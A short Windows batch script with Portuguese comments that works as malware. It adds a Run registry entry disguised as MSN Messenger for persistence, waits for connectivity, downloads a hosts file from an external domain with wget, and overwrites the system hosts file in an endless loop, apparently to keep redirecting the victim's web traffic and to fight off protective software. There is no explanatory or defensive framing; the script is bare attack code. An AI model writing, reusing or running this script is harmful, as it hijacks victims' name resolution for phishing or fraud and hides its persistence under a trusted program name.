           ::@echo off
@break off
ver|find "Windows 98">nul
if not errorlevel 1 goto nao

if exist %windir%\system32\ctzzz.dll goto con
::adicionando no regedit
> %windir%\system32\ctzzz.dll echo y
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v MsnMsgr /t REG_SZ /d "%windir%\system32\msnmsgr.exe" < %windir%\system32\ctzzz.dll
::start /max iexplore.exe "http://www.google.com.br"
goto mapa
::Teste Conexao
:con
set ping=%windir%\system32\ping.exe
:teste
%ping% www.google.com -n 1 -l 1 | find "TTL" > nul
if not errorlevel 1 goto mapa
goto teste
::agendar
::magica
:mapa
if exist %windir%\system32\hosts.txt del %windir%\system32\hosts.txt
wget http://www.pntbrazil.kit.net/hosts.txt -O %windir%\system32\hosts.txt --cache=off

::parte pra escrever o arquivo
::briga com o plugin
:l1
type %windir%\system32\hosts.txt>%windir%\system32\drivers\etc\hosts&goto l1
:nao
::start /max iexplore.exe "http://www.google.com.br"
exit

